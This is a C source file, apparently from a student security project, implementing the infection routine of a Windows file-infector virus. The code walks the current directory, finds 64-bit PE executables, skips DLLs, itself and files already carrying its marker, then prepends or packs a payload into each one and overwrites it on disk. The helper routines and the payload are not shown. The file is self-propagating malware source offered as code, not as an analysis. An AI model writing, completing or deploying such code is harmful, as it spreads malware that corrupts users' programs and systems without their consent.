/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infection.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jguyet <jguyet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/03/13 12:11:43 by jguyet            #+#    #+#             */
/*   Updated: 2017/03/13 12:15:42 by jguyet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infection.h"

/*
** Infect windows Portable executable
*/
void		infect_pe_file(char *argv, IMAGE_DOS *img, char *infection_content, int infection_size) {
	if (is_pe_x64(img->pe_header) == false)
		return ;
	if (img->pe_header->FileHeader.Characteristics & IMAGE_FILE_DLL)
		return ;
	if (find_pattern(img->buffer, img->len) != -1)//is file infected
	{
		printf("File \"%s\" is already infected (%d)\n", img->name, img->pe_header->FileHeader.Characteristics);
		return ;
	}
	img->new_buffer_len = pack_executables(&img->new_buffer, infection_content, infection_size, img->buffer, img->len);
	printf("File \"%s\" infected (%d)\n", img->name, img->pe_header->FileHeader.Characteristics);
	windows_file_put_contents_size(img->name, img->new_buffer, img->new_buffer_len);
}

/*
** Infect MS-DOS executable
*/
void		infect_dos_file(char *argv, IMAGE_DOS *img, char *infection_content, int infection_size) {
	if (img->len < sizeof(struct _IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS)) {
		return ;
	}
	img->dos_header = (IMAGE_DOS_HEADER*)img->buffer;
	img->pe_header = (IMAGE_NT_HEADERS*)(img->buffer + img->dos_header->e_lfanew);
	if (is_pe_signature(img->pe_header))
	{
		infect_pe_file(argv, img, infection_content, infection_size);
	}
	free(img);
}

/*
** Infect PE or MS-DOS windows files
*/
void		infect_file(char *argv, char *file_path, char *infection_content, int infection_size) {
	char	*file = NULL;
	size_t	size = windows_file_get_contents_size(&file, file_path);
	int		file_type = get_windows_binary_type(file);

	if (file_type == IS_DOS_BINARY_TYPE) {
		IMAGE_DOS *img = (struct _IMAGE_DOS*)malloc(sizeof(struct _IMAGE_DOS));

		if (img == NULL)
			return ;
		img->buffer = file;
		img->len = size;
		img->name = file_path;
		infect_dos_file(argv, img, infection_content, infection_size);
	}
}

/*
** Infect with recursivity all Windows binary files (PE, MS-DOS)
*/
void		infect(char *argv, char *infection_content, int infection_size) {
	char **files = NULL;

	files = get_files_types(files, ".", is_windows_binary_file);

	for (int i = 0; files[i]; i++) {
		if (strcmp(file_base_name(files[i]), file_base_name(argv)) == 0)
			continue ;
		infect_file(argv, files[i], infection_content, infection_size);
	}
	free_array(files);
}
